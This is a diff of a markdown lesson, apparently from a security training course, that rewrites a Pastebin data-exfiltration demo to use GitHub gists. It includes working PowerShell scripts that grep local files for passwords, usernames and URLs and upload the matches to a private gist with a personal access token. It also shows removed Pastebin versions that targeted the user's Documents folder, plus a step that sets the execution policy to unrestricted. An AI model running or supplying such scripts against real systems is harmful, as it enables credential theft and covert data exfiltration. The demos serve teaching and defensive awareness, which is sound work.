@@ -1,11 +1,11 @@
 ---
 layout: default
-title: Data Exfiltration using Pastebin
-nav_order: 15
+title: Data Exfiltration using Github
+nav_order: 16
 ---
-# Pastebin First demo
+# Github First demo
 
-Go to the folder where you previously created logindata.ps1 and create a new file called `new-pastebin.ps1` with the code below. Open your terminal and run new-pastebin.ps1 (don't doubleclick in windows, run it via the Powershell terminal)
+Go to the folder where you previously created logindata.ps1 and create a new file called `new-github.ps1` with the code below. Open your terminal and run new-github.ps1 (don't doubleclick in windows, run it via the Powershell terminal)
 
 You might have to launch powershell as administrator first to change the set-executionpolicy to "unrestricted"
 
@@ -17,103 +17,105 @@ set-executionpolicy unrestricted
 2. Visit this URL
 
 ```powershell
-#Demo 1, Something easy. Userkey won't be used yet so everything is anonymous
+#Demo 1, github requires your Fine-grained personal access token
 . .\logindata.ps1
-$Content    =   Invoke-WebRequest -Uri "https://ipinfo.io/json"
-$Title      =   "pastebin1"
+$Content = Invoke-WebRequest -Uri "https://ipinfo.io/json"
 
-$Body = @{ 
-    api_dev_key         = $DevKey;
-    #    api_user_key        = $UserKey;
-    api_paste_name	    = $Title;
-    api_paste_code      = $Content;
-    api_paste_private   = "0"; # 0=public 1=unlisted 2=private
-    api_option          = "paste";
+. .\logindata.ps1
+$Content = Invoke-WebRequest -Uri "https://ipinfo.io/json"
+
+$body = @{
+    description = "Uploading a first gist to github"
+    public      = $false
+    files       = @{
+        "snippet.txt" = @{
+            content = $Content.Content
+        }
     }
+} | ConvertTo-Json
 
-Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
+Invoke-WebRequest `
+  -Uri "https://api.github.com/gists" `
+  -Method POST `
+  -Headers @{
+    "Authorization" = "Bearer $FGPAT"
+    "X-GitHub-Api-Version" = "2022-11-28"
+  } `
+  -Body $body `
+  -ContentType "application/json" `
+  -outfile results.txt
+
 ```
+You should have some feedback, corresponding more or less with the following output:
 
+![Feedback](../images/Githubdemo1-1.png)
+
+And in your gists online, you should also see some structured output:
+
+![Contents of your gists](../images/Githubdemo1.png)
 You might encounter an error related to the "internet explorer engine", if that's the case: launch internet explorer and click through the initial setup.
 
 ![Internet Explorer first setup](../images/IE11.png)
 
 This should fix your issue.
 
-## Preparing a more advanced use of Pastebin
-Thus far, our data exiltration is public.​ Thanks to the API key we can upload to Pastebin but we need to use authentication to make it private, so let’s make it private​ 😃.
-
-For this we need to setup our “userkey”​
-
-This means we will use 2 keys​: 
-1. Our dev key, which we already have​.
-2. Our user key, which still needs creation.
-
-### Userkey creation
-
-Create a new file called `get-apiuserkey.ps1`, using the code below.
-```powershell
-
-$DevKey     = "PUT-DEV-KEY-HERE"
-$Username   = "PUT-PASTEBIN-USERNAME-HERE"
-$Password   = "PUT-PASTEBIN-PASSWORD-HERE"
-$PasteBinLogin = "https://pastebin.com/api/api_login.php"
-$Body = @{ 
-    api_dev_key = $DevKey;
-    api_user_name	= $Username;
-    api_user_password = $Password;
-    }
-
-Invoke-WebRequest -Uri $PasteBinLogin -UseBasicParsing -Body $Body -Method Post -OutFile Api_user_key.txt
-```
-- Fill in the 3 required variables at the top.
-- Run the script from the terminal.
-- Your userkey is saved in Api_user_key.txt
-- Add this key to logindata.ps1
-
-
-Once this is done… we’re cooking!
-
 ### Create some dummy files
-For demo purposes we're going to create 2 dummy files: `password.txt` and `secrets.txt` put these 2 files in your documents folder: `C:\Users\$env:username\Documents`
+For demo purposes we're going to create 2 dummy files: `password.txt` and `secrets.txt` Create a temp folder on your harddisk (if none exist) and put these 2 files in it folder: `C:\temp`
 
 password.txt has the following contents
 ```powershell
 
-PUT THIS FILE IN C:\Users\$env:username\Documents
+PUT THIS FILE IN C:\temp
 I do silly things like sometimes putting passwords in files.
 
 ```
 secret.txt has the following contents
 ```
-PUT THIS FILE IN C:\Users\$env:username\Documents
+PUT THIS FILE IN C:\temp
+
 this is my secret file
 my password for example.com is Kameham3ha!
 my username for example.com is ThebrokeShadower
 https://www.example.com/login-or-something
 ```
-# Pastebin second demo
-Create a new file called "new-pastebin2.ps1" and copy paste the following data in it:
+# Github second demo
+Create a new file called "new-github2.ps1" and copy paste the following data in it:
 ```powershell
 
 #Demo 2, let's grab some passwords from local files!
 . .\logindata.ps1
-$Content    =   ls c:\users\$env:username\Documents -r | Select-String password,username,http | select line,path
-$Title      =   "pastebin2"
+$Content = ls c:\temp -r | Select-String password,username,http | select line,path
+$ContentString = $Content | ForEach-Object { "$($_.path): $($_.line)" } | Out-String
 
-$Body = @{ 
-    api_dev_key         = $DevKey;
-    api_user_key        = $UserKey;
-    api_paste_name	    = $Title;
-    api_paste_code      = $Content;
-    api_paste_private   = "2"; # 0=public 1=unlisted 2=private
-    api_option          = "paste";
+$Description = "Github second demo"
+
+$body = @{
+    description = $Description
+    public      = $false
+    files       = @{
+        "secrets.txt" = @{
+            content = $ContentString
+        }
     }
+} | ConvertTo-Json -Depth 4
 
-Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
+Invoke-WebRequest `
+  -Uri "https://api.github.com/gists" `
+  -Method POST `
+  -Headers @{
+    "Authorization" = "Bearer $FGPAT"
+    "X-GitHub-Api-Version" = "2022-11-28"
+  } `
+  -Body $body `
+  -ContentType "application/json" `
+  -OutFile results.txt
+
+
 ```
-Execute new-pastebin2.ps1 from the terminal. If all goes well, you will have this pastebin under your personal account on the pastebin.com website.
-But there seems to be a problem?
+Execute new-github2.ps1 from the terminal. If all goes well, you will have this gist under your personal account on the github website.
+
+![Github demo 2](../images/githubdemo2.png)
+
 
 # Pastebin third demo
 
